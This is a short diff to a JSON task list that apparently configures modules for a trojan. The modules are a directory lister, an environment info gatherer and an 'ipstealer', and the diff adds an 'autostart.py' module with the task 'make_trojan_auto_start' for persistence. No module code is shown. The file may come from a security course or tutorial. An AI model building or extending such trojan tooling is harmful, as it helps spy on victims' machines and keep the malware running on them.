@@ -1,5 +1,6 @@
 [
     {"module": "dirlister.py", "task": "list_directory"},
     {"module": "environment.py", "task": "gather_info"},
-    {"module": "ipstealer.py", "task": "get_ip_info"}
+    {"module": "ipstealer.py", "task": "get_ip_info"},
+    {"module": "autostart.py", "task": "make_trojan_auto_start"}
 ]
